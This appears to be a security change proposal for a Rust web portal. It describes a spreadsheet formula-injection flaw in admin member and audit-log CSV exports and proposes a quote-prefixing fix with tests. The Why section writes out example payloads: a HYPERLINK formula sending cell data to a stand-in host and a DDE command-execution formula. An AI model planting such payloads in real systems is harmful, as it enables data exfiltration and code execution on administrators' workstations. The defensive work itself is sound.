## Why

The admin CSV exports neutralize commas/quotes/newlines per RFC 4180 but
do NOT neutralize spreadsheet **formula injection** (CWE-1236). The
shared field writer `push_csv` in `src/web/portal/admin/csv.rs:9-20`
only wraps each value in double quotes and doubles internal quotes; it
never guards a leading `=`, `+`, `-`, or `@`.

Two exports feed attacker-controlled free text through this writer:

- **Member roster export** — `build_members_csv` in
  `src/web/portal/admin/members/bulk.rs:118-166` emits `email`,
  `username`, `full_name`, `discord_id`, and `notes` via `push_csv`.
- **Audit-log export** — `audit_log_export` in
  `src/web/portal/admin/audit.rs:207-228` emits `actor_name`,
  `entity_id`, `old_value`, and `new_value` via `push_csv`.

The input is attacker-controlled at an **unauthenticated** trust
boundary: `POST /public/signup` (`src/api/handlers/public.rs:73-145`)
accepts `full_name`, `username`, and `email` and applies no character
restrictions (the only checks are `email.contains('@')` and password
strength — see `src/api/handlers/public.rs:97-105`).
`MemberService::create` (`src/service/member_service/create.rs:24-48`)
and the repository persist the values verbatim. So an anonymous attacker
can register with `full_name` =
`=HYPERLINK("https://evil.example/?l="&A1&A2,"click")` (or a
`=WEBSERVICE(...)` / DDE `=cmd|'/c calc'!A1` payload). The same value
also lands in audit `new_value` / `actor_name` fields.

Concrete harm: when an admin later downloads
`GET /portal/admin/members/export` (or `/portal/admin/audit/export`)
and opens it in Excel or LibreOffice Calc, the cell is evaluated as a
formula. Depending on the spreadsheet and its settings this enables
silent data exfiltration of other cells (`=HYPERLINK` / `=WEBSERVICE` /
`=IMPORTDATA`) or, via DDE, command execution on the admin's
workstation. The attacker needs no account approval — a `Pending`
signup row is included by the unfiltered export (`bulk.rs:30-84` exports
every status).

## What Changes

- Add a formula-neutralizing field writer alongside `push_csv` in
  `src/web/portal/admin/csv.rs`. For values whose first character is a
  formula trigger (`=`, `+`, `-`, `@`) or a control character a
  spreadsheet may treat as starting a formula (TAB `\t`, CR `\r`, LF
  `\n`), it prepends a single quote (`'`) **inside** the RFC 4180
  quoting so the spreadsheet renders the cell as literal text. All
  existing RFC 4180 quote-doubling behavior is preserved.
- Route the attacker-controlled free-text columns of the member export
  (`email`, `username`, `full_name`, `discord_id`, `notes`) and the
  audit export (`actor_name`, `entity_id`, `old_value`, `new_value`)
  through the new writer. Numeric / timestamp / enum / boolean columns
  (e.g. `is_admin`, `joined_at`, `status`) keep using plain `push_csv`,
  so no numeric or date column is converted to text.
- Add unit tests asserting a formula-leading value is prefixed with `'`
  and that ordinary values (e.g. `O'Brien, Sean`) are unchanged.

This is a hardening of the export writers only; the CSV column set,
ordering, headers, filters, and audit behavior are unchanged.

## Impact

- `src/web/portal/admin/csv.rs` — add the neutralizing writer (new
  `pub fn`); keep `push_csv` for non-user columns.
- `src/web/portal/admin/members/bulk.rs` — `build_members_csv` uses the
  new writer for the five free-text columns.
- `src/web/portal/admin/audit.rs` — `audit_log_export` uses the new
  writer for the four free-text columns.
- Specs: `bulk-member-csv-export` and `admin-audit-log` gain a
  formula-neutralization requirement (this change's spec deltas).
- Note: the bulk CSV **import** parser
  (`src/web/portal/admin/members/bulk.rs:342-487`) reads a different
  header set (`membership_type_slug`, not the export's
  `membership_type`), so it is not a clean re-import of the export and
  the added leading `'` does not corrupt an import round-trip.
